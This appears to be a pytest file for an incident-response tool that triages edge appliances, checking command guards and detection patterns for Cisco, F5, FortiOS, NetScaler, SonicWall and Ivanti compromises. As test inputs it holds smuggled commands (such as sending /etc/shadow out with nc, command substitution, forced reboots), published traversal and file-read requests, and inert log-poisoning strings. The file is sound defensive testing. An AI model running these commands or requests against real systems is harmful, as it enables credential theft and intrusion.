    p = get_profile("cisco-iosxe")
    p.check_command("more bootflash:packages.conf")
    for bad in ("more bootflash:x.conf | redirect tftp://192.0.2.1/x", "more bootflash:vlan.dat"):
        with pytest.raises(Exception):
            p.check_command(bad)


def test_asa_error_output_is_not_evaluated(fx, tmp_path):
    import shutil
    from edgetriage.util import slugify
    rp = tmp_path / "asaerr"
    shutil.copytree(fx / "asa-benign", rp)
    for c in ("show memory region | include lina", "show memory region"):
        (rp / "commands" / (slugify(c) + ".txt")).write_text("ERROR: % Invalid input detected at '^' marker.\n")
    case = Case(tmp_path / "IR-ASAERR")
    collect(get_profile("cisco-asa"), ReplayTransport(rp), case, case_id="IR-ASAERR", operator="t",
            target={"host": "192.0.2.10"}, preflight={}, variables={})
    assert det(analyze(case.root), "asa-lina-multiple-exec-regions")["status"] == "not-evaluated"


def test_iosxe_implant_check_response_confirms(fx, tmp_path):
    root = run(fx, tmp_path, "cisco-iosxe", "iosxe-benign", variables={"boot_image": IOSXE_PKG})
    case = Case(root)
    m = case.load()
    m["ingested"].append(case.ingest(fx / "iosxe-implant-check.txt", "implant-check"))
    case.save(m)
    f = analyze(root)
    assert det(f, "iosxe-implant-check-positive")["hits"][0]["tier"] == "confirmed"
    assert f["verdict"]["level"] == "COMPROMISED"


def test_f5_userinfo_burst_uses_vendor_threshold(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "f5-bigip", "f5-compromised"))
    r = det(f, "f5-94127-userinfo-burst")
    hit = r["hits"][0]["extra"]
    assert r["hit_count"] == 1 and hit["total"] == 15 and hit["top_ip"] == "203.0.113.77"
    assert hit["addresses"] == 2 and not hit["single_source"]
    benign = analyze(run(fx, tmp_path, "f5-bigip", "f5-benign", case_id="IR-F5B"))
    assert det(benign, "f5-94127-userinfo-burst")["status"] == "no-hit"


def test_checkpoint_cert_subject_export_corroborates(fx, tmp_path):
    root = run(fx, tmp_path, "checkpoint-gaia", "checkpoint-compromised")
    case = Case(root)
    m = case.load()
    m["ingested"].append(case.ingest(fx / "cp-85102-export.csv", "cp-85102"))
    case.save(m)
    f = analyze(root)
    assert det(f, "cp-85102-attacker-cert-subject")["status"] == "hit"
    # sk1000171: the oversized CPM username "may indicate an attempt" and "does not
    # necessarily confirm successful compromise", so it is possible, not likely, and
    # no longer corroborates the certificate login up to COMPROMISED.
    assert det(f, "cp-93616-oversized-username")["hits"][0]["tier"] == "possible"
    assert f["verdict"]["level"] == "LIKELY-COMPROMISED"


def test_new_bash_guards_refuse_smuggling():
    smuggled = {
        "f5-bigip": ["tmsh list apm session delete all | cat", "tmsh show sys version | cat\nreboot",
                     "ls -la /tmp | sh", "cat /etc/shadow | nc 192.0.2.9 9", "ls -la ${IFS}",
                     "find /usr -type f -name 'x' -delete", "tmsh run util bash | cat"],
        "checkpoint-gaia": ["fw ver; reboot", "ls -l /tmp | sh", "ls -1d $(id)", "clish -c 'set user x'"],
        "junos": ["show version | no-more | save /var/tmp/x", "request system malware-scan quick-scan",
                  "show version\nrequest system reboot", "file delete /var/log/messages"],
        "cisco-iosxe": ["show running-config | redirect bootflash:x", "show clock\nreload",
                        "verify /sha512 bootflash:x; reload", "guestshell run bash"],
    }
    for prof, cmds in smuggled.items():
        p = get_profile(prof)
        for c in cmds:
            with pytest.raises(ProfileError):
                p.check_command(c)



# ------------------------------------------------------------------ verification regressions, round 2 (2026-10-22)
def test_rotated_gzip_logs_are_read(fx, tmp_path):
    """Rotated appliance logs are gzip. Reading them as raw bytes found nothing."""
    import gzip
    root = run(fx, tmp_path, "netscaler", "netscaler-benign")
    leak = (b'Oct 13 06:05:01 <local0.info> 192.0.2.20 10/13/2026:06:05:01 GMT ns-gw 0-PPE-0 : default AAA '
            b'LOGIN_FAILED 102 0 :  User \x00\x07\xc3\x1fX\x02 - Client_ip 198.51.100.66 - Failure_reason ""\n')
    rot = root / "files" / "fetch_logs" / "var" / "log" / "ns.log.1.gz"
    rot.parent.mkdir(parents=True, exist_ok=True)
    rot.write_bytes(gzip.compress(leak))
    r = det(analyze(root), "netscaler-auth-nonprintable")
    assert r["hit_count"] == 1 and r["hits"][0]["source"].endswith("ns.log.1.gz")


def test_truncated_gzip_does_not_crash(tmp_path):
    import gzip
    from edgetriage.evidence import Source, iter_lines
    good = gzip.compress(b"line one\nline two\n" * 1000)
    bad = tmp_path / "x.log.gz"
    bad.write_bytes(good[: len(good) // 2])
    lines = list(iter_lines(Source("file", "/x.log.gz", bad)))
    assert lines and lines[0][1] == b"line one"


def test_f5_burst_spread_across_addresses_is_caught(fx, tmp_path):
    """F5's rule is per log, not per address: 12 failures from 12 sources must fire."""
    root = run(fx, tmp_path, "f5-bigip", "f5-benign")
    apm = root / "files" / "fetch_apm" / "var" / "log" / "apm"
    line = ("Oct 14 06:{m:02d}:00 bigip-lab err tmm1[30975]: 01990004:3: /Common/oauth_as: Request UserInfo from "
            "Source ID (null) IP 203.0.113.{i}%2 failed. Error Code (invalid_token) Error Description (The access token is invalid.)")
    apm.write_text("\n".join(line.format(m=i, i=i) for i in range(12)) + "\n")
    r = det(analyze(root), "f5-94127-userinfo-burst")
    assert r["hit_count"] == 1 and r["hits"][0]["extra"]["addresses"] == 12   # route-domain suffix parsed too


def test_cpinfo_never_uploads():
    cmd = next(s for s in get_profile("checkpoint-gaia").steps if s.id == "cpinfo_bundle").cmd
    assert " -D " in cmd and " -d " in cmd    # no upload to Check Point, no self-update


def test_f5_audit_patterns_use_the_real_format():
    import re
    import yaml
    line = "Oct 14 07:01:02 bigip notice icrd_child[1]: AUDIT - pid=1 user=admin folder=/Common module=(tmos)# status=[Command OK] cmd_data=run util bash -c id"
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0017-f5-control-plane-historic.yml").read_text())
    pat = next(d["pattern"] for d in pack["detect"] if d["id"] == "f5-audit-util-bash-c")
    assert re.search(pat, line)


def test_iosxe_zero_disco_names_match_exactly(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "cisco-iosxe", "iosxe-compromised", variables={"boot_image": IOSXE_PKG}))
    assert det(f, "iosxe-zerodisco-config-names")["hit_count"] == 1
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0021-iosxe-snmp-zero-disco.yml").read_text())
    pat = re.compile(next(d["pattern"] for d in pack["detect"] if d["id"] == "iosxe-zerodisco-config-names"))
    assert pat.search("username dg5y8fpk privilege 15") and pat.search("ip access-list extended EnaQWklg2")
    assert not pat.search("event manager applet CiscoEMX-9") and not pat.search("username dg9y8zpk")


def test_netscaler_2026_chain_and_ncsc_checks(fx, tmp_path):
    f = analyze(run(fx, tmp_path, "netscaler", "netscaler-compromised"))
    for d in ("netscaler-pitboss-log-poisoning", "netscaler-logonpoint-hidden-receiver", "netscaler-php-engine-on",
              "netscaler-bin-sh-setuid", "netscaler-slap-framework-dir", "netscaler-rc-netscaler-python",
              "netscaler-httpd-protection-commented"):
        assert det(f, d)["status"] == "hit", d
    g = analyze(run(fx, tmp_path, "netscaler", "netscaler-benign", case_id="IR-TEST-B"))
    for d in ("netscaler-pitboss-log-poisoning", "netscaler-php-engine-on", "netscaler-bin-sh-setuid",
              "netscaler-httpd-protection-commented", "netscaler-rc-netscaler-python"):
        assert det(g, d)["status"] == "no-hit", d


def test_fortios_jsconsole_patterns_match_fortinet_lines():
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0023-fortios-jsconsole-auth-bypass.yml").read_text())
    pat = {d["id"]: re.compile(d["pattern"]) for d in pack["detect"]}
    # Lines as Fortinet publishes them in FG-IR-24-535.
    login = ('type="event" subtype="system" level="information" vd="root" logdesc="Admin login successful" sn="1733486785" '
             'user="admin" ui="jsconsole" method="jsconsole" srcip=1.1.1.1 dstip=1.1.1.1 action="login" status="success" '
             'reason="none" profile="super_admin" msg="Administrator admin logged in successfully from jsconsole"')
    add = ('type="event" subtype="system" level="information" vd="root" logdesc="Object attribute configured" user="admin" '
           'ui="jsconsole(127.0.0.1)" action="Add" cfgtid=1411317760 cfgpath="system.admin" cfgobj="vOcep" '
           'cfgattr="password[*]accprofile[super_admin]vdom[root]" msg="Add system.admin vOcep"')
    assert pat["fortios-jsconsole-admin-login"].search(login)
    assert pat["fortios-jsconsole-admin-add"].search(add)
    assert not pat["fortios-jsconsole-admin-login"].search(login.replace('ui="jsconsole"', 'ui="https(192.0.2.10)"'))


# ------------------------------------------------------------------ verification regressions, round 3 (2026-10-23)
class _StepView:
    """Minimal evidence view for coded checks: step text plus a manifest."""
    def __init__(self, steps):
        self.t = steps
        self.manifest = {"steps": [{"step_id": k, "status": "ok"} for k in steps]}
    def step_text(self, s): return self.t.get(s)
    def rejected_members(self): return []


def test_fortios_crashlog_check_pairs_published_rows():
    """The crash log prints the application and the signal on separate rows (Fortinet tech tip)."""
    from edgetriage.checks.fortinet import fortios_crashlog_sslvpnd_segv as chk
    published = ("xxxx: [ Date & Time ] <.....> firmware [ Firmware version ]\n"
                 "xxxx: [ Date & Time ] <.....> application sslvpnd\n"
                 "xxxx: [ Date & Time ] <.....> *** signal 11 (Segmentation fault) received ***\n")
    ok, hits = chk(_StepView({"crashlog": published}), {})
    assert ok and len(hits) == 1
    other = published.replace("application sslvpnd", "application httpsd")
    assert chk(_StepView({"crashlog": other}), {}) == (True, [])
    assert chk(_StepView({"crashlog": "Command fail. Return code -1\n"}), {}) == (False, [])  # nothing parsed
    assert chk(_StepView({}), {}) == (False, [])                                               # not collected
    # The event-log form stays with the line regex.
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0003-fortios-sslvpn-persistence.yml").read_text())
    pat = {d["id"]: d for d in pack["detect"]}["fortios-sslvpnd-crash"]
    import re
    event = 'logdesc="Application crashed" msg="[...] application: sslvpnd,[...], Signal 11 received, Backtrace: [...]"'
    assert re.search(pat["pattern"], event, re.I)


def test_fortios_symlink_check_accepts_the_clean_custom_link():
    from edgetriage.checks.fortinet import fortios_symlink_to_root as chk
    clean = "lrwxrwxrwx 1 peter peter 18 Jan 20 01:00 custom -> /data2/custom_lang\n"
    assert chk(_StepView({"listing_sslvpn_lang": clean}), {}) == (True, [])
    ok, hits = chk(_StepView({"listing_sslvpn_lang": clean.replace("/data2/custom_lang", "/")}), {})
    assert ok and len(hits) == 1
    # /bin is full of links to /bin/init on a clean device (Mandiant's listing); not scored here.
    bin_rows = "lrwxrwxrwx 1 root root 9 Oct 18 13:09 lldptx -> /bin/init\n"
    assert chk(_StepView({"listing_bin": bin_rows}), {}) == (False, [])


def test_fortios_listing_patterns_match_published_rows():
    import re
    import yaml
    pats = {}
    for f in ("EDGE-PACK-0003-fortios-sslvpn-persistence.yml", "EDGE-PACK-0024-fortios-cve-2022-41328.yml"):
        for d in yaml.safe_load((ROOT / "artifacts/packs" / f).read_text())["detect"]:
            if d["type"] == "log_regex":
                pats[d["id"]] = re.compile(d["pattern"])
    # Mandiant, `fnsysctl ls -la /bin` on a compromised and a clean FortiGate.
    assert pats["fortios-41328-lspci-symlink"].search("lrwxrwxrwx 1 root root 11 Oct 19 05:11 lspci -> /bin/sysctl")
    assert not pats["fortios-41328-lspci-symlink"].search("-rwxr-xr-x 1 0 0 Fri Sep 2 12:07:55 2022 131736 lspci")
    assert pats["fortios-41328-castletap-fgfm"].search("-rwxr-xr-x 1 0 0 Fri Sep 2 12:07:55 2022 131736 fgfm")
    assert not pats["fortios-41328-castletap-fgfm"].search("lrwxrwxrwx 1 0 0 Fri Sep 2 12:07:55 2022 9 fgfmd -> /bin/init")
    # MIVD/AIVD COATHANGER: smartctl that is not a symlink, the tcpsock row, the PID 1 map row.
    smart = pats["fortios-coathanger-smartctl"]
    assert smart.search("-rwxr-xr-x 1 0 0 Fri Sep 2 12:07:55 2022 52344 smartctl")
    assert not smart.search("lrwxrwxrwx 1 0 0 Fri Sep 2 12:07:55 2022 9 smartctl -> /bin/init")
    sock = ("<device_IP>:<device_port>-><c2_IP>:<c2_port>->state=established err=0 socktype=1 rma=0 wma=0 "
            "fma=0 tma=0 inode=<inode> process=<PID>/httpsd")
    assert pats["fortios-coathanger-httpsd-socket"].search(sock)
    assert not pats["fortios-coathanger-httpsd-socket"].search(sock.replace("established", "listen"))
    assert pats["fortios-coathanger-preload-map"].search("7f7ff.....-7f7ff..... ....    0000....   00:..   .....   /lib/preload.so (deleted)")
    assert pats["fortios-coathanger-preload-map"].search("0040.....-0040..... ....     0000....   b3:..   .....  /data2/httpsd (deleted)")
    # Fortinet FG-IR-22-398 file indicators in `fnsysctl ls -l` rows.
    ioc = pats["fortios-42475-ioc-files"]
    for name in ("libips.bak", "libgif.so", "libiptcp.so", "libipudp.so", "libjepg.so", ".sslvpnconfigbk", "wxd.conf", "flash"):
        assert ioc.search(f"-rw-r--r-- 1 0 0 4096 Mar 1 10:00 {name}"), name
    assert not ioc.search("-rw-r--r-- 1 0 0 4096 Mar 1 10:00 libips.so")


# ------------------------------------------------------------------ SonicWall SMA 100 (OVERSTEP)
def _sma_case(fx: Path, tmp: Path, image: str) -> dict:
    case = Case(tmp / image.replace(".tgz", ""))
    m = Case.new_manifest(case.root.name, "tester", "EDGE-0006", None)
    m["expected_evidence"] = []
    m["ingested"].append(case.ingest(fx / image, "image"))
    case.save(m)
    return analyze(case.root)


def test_sma_ld_so_preload_uses_gtig_size_threshold(fx, tmp_path):
    """GTIG: ld.so.preload 'with greater than 2 bytes of contents'. An empty file is
    evaluated and does not fire; a missing file is not evaluated."""
    hit = _sma_case(fx, tmp_path, "sma-image-overstep.tgz")
    assert det(hit, "sma-ld-so-preload")["status"] == "hit"
    assert det(hit, "sma-overstep-cf-files")["hit_count"] == 2          # /cf/xxx.elf, /cf/libsamba-errors.so.6
    assert det(hit, "sma-overstep-published-hash")["status"] == "no-hit"  # placeholders never match GTIG's hashes
    empty = _sma_case(fx, tmp_path, "sma-image-empty-preload.tgz")
    assert det(empty, "sma-ld-so-preload")["status"] == "no-hit"
    assert det(empty, "sma-overstep-cf-files")["status"] == "no-hit"
    missing = _sma_case(fx, tmp_path, "sma-image-no-preload.tgz")
    assert det(missing, "sma-ld-so-preload")["status"] == "not-evaluated"


def test_sma_overstep_hash_rule_carries_gtig_values():
    """The YARA hash rule and the parsed GTIG indicator set hold the same SHA256 values."""
    import re
    import yaml
    rule = (ROOT / "06-sonicwall-sma/sma_overstep_published_hashes.yar").read_text()
    ioc = yaml.safe_load((ROOT / "artifacts/intel/iocs/EDGE-IOC-0008-gtig-unc6148-overstep.yml").read_text())
    published = {i["value"] for i in ioc["indicators"] if i["type"] == "sha256"}
    assert set(re.findall(r'== "([0-9a-f]{64})"', rule)) == published and len(published) == 2
    import yara
    yara.compile(filepath=str(ROOT / "06-sonicwall-sma/sma_overstep_published_hashes.yar"))


def test_sma_38475_patterns_cover_the_rewrite_rule():
    """watchTowr's published request is caught by the literal; other suffixes the
    abused RewriteRule accepts are caught by the generalised pattern instead."""
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0022-sonicwall-sma-2025-credential-access.yml").read_text())
    d = {x["id"]: x for x in pack["detect"]}
    lit, gen = d["sma-38475-css-suffix-file-read"], d["sma-38475-css-suffix-generalised"]
    published = "GET /tmp/temp.db%3f.1.1.1.1a-1.css"
    variant = "GET /tmp/temp.db%3F.20.4.0.17xyz-9.css HTTP/1.1"
    hits = lambda det_, line: bool(re.search(det_["pattern"], line, re.I)) and not any(
        re.search(x, line, re.I) for x in det_.get("exclude", []))
    assert hits(lit, published) and not hits(gen, published)
    assert hits(gen, variant) and not hits(lit, variant)
    assert not hits(gen, "GET /css/style.1.2.3.4abc-5.css HTTP/1.1")    # the rule's legitimate use has no %3f


def test_netscaler_pitboss_pattern_takes_both_published_forms():
    """Unit 42 prints no space before NSPPE; Rapid7 prints one. Payloads here are inert."""
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0028-netscaler-2026-log-poisoning.yml").read_text())
    pat = re.compile({d["id"]: d for d in pack["detect"]}["netscaler-pitboss-log-poisoning"]["pattern"])
    sigma = yaml.safe_load((ROOT / "04-citrix-netscaler/netscaler_cve_2026_88771_pitboss_log_poisoning.yml").read_text())
    assert sigma["detection"]["selection"]["Message|re"] == pat.pattern
    assert pat.search("pitboss PPE missed too many heartbeatsNSPPE;echo fixture-only")     # Unit 42 form
    assert pat.search("pitboss PPE unexpectedly died NSPPE;echo fixture-only")              # Rapid7 form
    assert pat.search("pitboss PPE unexpectedly died NSPPE-00;echo fixture-only")
    assert not pat.search("pitboss PPE unexpectedly died NSPPE;")                            # nothing appended


def test_netscaler_2026_listing_patterns():
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0028-netscaler-2026-log-poisoning.yml").read_text())
    p = {d["id"]: re.compile(d["pattern"]) for d in pack["detect"] if d["type"] == "log_regex"}
    assert p["netscaler-slap-framework-dir"].search("drwxr-xr-x  2 root  wheel  512 Oct 14 07:21 .relay")
    assert p["netscaler-nsvm-flash-dir"].search("drwxr-xr-x  2 root  wheel  512 Oct 14 07:21 .nsvm")
    assert not p["netscaler-nsvm-flash-dir"].search("drwxr-xr-x  3 root  wheel  512 Oct 01 09:00 nsconfig")
    assert p["netscaler-var-tmp-staging"].search("drwxr-xr-x  2 nobody  wheel  512 Oct 14 07:30 .s2loot")
    assert p["netscaler-rc-netscaler-nsvm"].search("/flash/.nsvm/nsvmd &")


def test_netscaler_nonprintable_takes_vendor_and_huntress_forms():
    from edgetriage.checks.netscaler import _leaky
    vendor = (b'10/13/2026:06:05:01 GMT ns-gw 0-PPE-0 : default AAA Message 2001 0 : '
              b'"Authentication is rejected for \xc3\x9f\x80\x01leak"')
    assert _leaky(vendor)
    assert not _leaky(vendor.replace(b"\xc3\x9f\x80", b"jdoe"))         # control byte only: vendor counts 128-255
    huntress = b'default AAA LOGIN_FAILED 102 0 :  User \x00\x07\xc3\x1fX\x02 - Client_ip 198.51.100.66'
    assert _leaky(huntress)
    assert not _leaky(b'default AAA LOGIN_FAILED 101 0 :  User jdoe-lab - Client_ip 198.51.100.20')
    # Bytes elsewhere in the line (before the marker) do not count.
    assert not _leaky(b'\xff\xfe AAA Message : "Authentication is rejected for jdoe-lab"')


def test_ivanti_traversal_takes_both_published_payloads():
    import re
    import yaml
    pack = yaml.safe_load((ROOT / "artifacts/packs/EDGE-PACK-0007-ivanti-ics-2024-chain.yml").read_text())
    p = {d["id"]: re.compile(d["pattern"], re.I) for d in pack["detect"]}
    trav = p["ivanti-totp-traversal"]
    # Assetnote's published requests.
    assert trav.search("GET /api/v1/totp/user-backup-code/../../system/system-information")
    assert trav.search("GET /api/v1/cav/client/status/../../admin/options")
    assert trav.search("GET /api/v1/cav/client/status/.%2e/.%2e/admin/options")
    assert not trav.search("GET /api/v1/totp/user-backup-code/12345")
    assert p["ivanti-traversal-to-injectable-endpoint"].search(
        "GET /api/v1/totp/user-backup-code/../../license/keys-status/x")
